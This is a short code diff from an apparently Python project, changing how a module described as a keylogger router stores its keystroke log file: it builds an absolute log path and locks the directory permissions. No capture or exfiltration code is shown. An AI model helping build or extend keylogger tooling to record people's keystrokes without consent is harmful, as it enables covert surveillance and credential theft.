@@ -10,13 +10,15 @@ from datetime import datetime
 # Router for keylogger functionality
 router = Router()
 
-# File to store keylogs
-KEYLOG_FILE = "logs/keylog.txt"
+# Get the absolute path for logs directory
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+LOG_DIR = os.path.join(BASE_DIR, '..', 'logs')
+KEYLOG_FILE = os.path.join(LOG_DIR, 'keylog.txt')
 
 # Ensure logs directory exists with correct permissions
-os.makedirs('logs', exist_ok=True)
+os.makedirs(LOG_DIR, exist_ok=True)
 try:
-    os.chmod('logs', 0o700)  # Restrict access to logs directory
+    os.chmod(LOG_DIR, 0o700)  # Restrict access to logs directory
 except Exception as e:
     logging.error(f"Failed to set permissions on logs directory: {e}")
 
